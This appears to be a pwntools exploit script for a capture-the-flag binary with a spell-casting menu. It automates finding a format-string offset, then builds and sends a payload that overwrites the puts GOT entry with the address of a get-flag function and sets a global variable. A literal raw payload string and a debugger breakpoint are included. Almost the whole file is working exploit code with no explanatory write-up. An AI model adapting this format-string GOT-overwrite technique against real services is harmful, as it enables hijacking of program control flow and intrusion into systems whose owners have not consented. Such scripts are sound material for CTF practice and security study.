#!/usr/bin/python2

from pwn import *

binary = './chall'
elf = ELF(binary)
context.binary = binary
PROCESS = [binary]
# context.terminal = ['tilix', '-a', 'app-new-session', '-e']

HOST = ''
PORT = 0


def run():
    if args.R:
        return remote(HOST, PORT)
    else:
        return process(PROCESS)


# Addresses
GET_FLAG = 0x80485b6
CIRCLE_OF_ELEMENTS = 0x8049c48
PUTS_GOT = 0x8049c28


# Helper function to find offset
def exec_fmt(payload):
    r = run()

    r.recvuntil('Choose spell to cast: ')

    log.info(repr(payload))
    r.sendline(payload)

    r.recvuntil('Spell not found : ')
    output = r.recvuntil('\n\n')
    log.info(output)
    r.close()
    return output


autopwn = FmtStr(exec_fmt)
# stack offset
OFFSET = autopwn.offset
# Padding for stack alignment, need to find it MANUALLY
padding = autopwn.padlen
# number of chars written before format string
numbwritten = len('Spell not found : ')  # 18
numbwritten += padding  # 2
numbwritten += len(p32(PUTS_GOT))  # 4
numbwritten += len(p32(PUTS_GOT + 1))  # 4
numbwritten += len(p32(PUTS_GOT + 2))  # 4
numbwritten += len(p32(PUTS_GOT + 3))  # 4
numbwritten += len(p32(CIRCLE_OF_ELEMENTS))  # 4
numbwritten += len('.')  # 1
# Atomic writes
atoms = []
atoms.append(fmtstr.AtomWrite(0x8049c48, 0x1, numbwritten + 1))
atoms.append(fmtstr.AtomWrite(0x08049c28, 0x1, 0xb6))
atoms.append(fmtstr.AtomWrite(0x08049c28 + 1, 0x1, 0x85))
atoms.append(fmtstr.AtomWrite(0x08049c28 + 2, 0x1, 0x04))
atoms.append(fmtstr.AtomWrite(0x08049c28 + 3, 0x1, 0x08))
# make payload based on atomic writes
fmt, data = fmtstr.make_payload_dollar(data_offset=OFFSET,
                                       atoms=atoms, numbwritten=numbwritten)

payload = 'A' * padding
payload += data
payload += '.'
payload += fmt

# Start exploit from all info above
log.info('****************')
log.info('Starting Exploitation....')
log.info('****************')
log.info('Padding: {}'.format(padding))
log.info('Offset: {}'.format(OFFSET))
log.info('Numbwritten: {}'.format(numbwritten))

p = run()
if args.D:
    gdb.attach(p, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
        b *0x080487d8  # break just before call puts()
        ''')

p.recvuntil('Choose spell to cast: ')
log.info('Payload: {}'.format(repr(payload)))
# payload = 'AAH\x9c\x04\x08(\x9c\x04\x08)\x9c\x04\x08*\x9c\x04\x08+\x9c\x04\x08.%1c%11$hhn%140c%12$hhn%207c%13$hhn%127c%14$hhn%4c%15$hhn'
p.sendline(payload)
log.info(p.recvall())
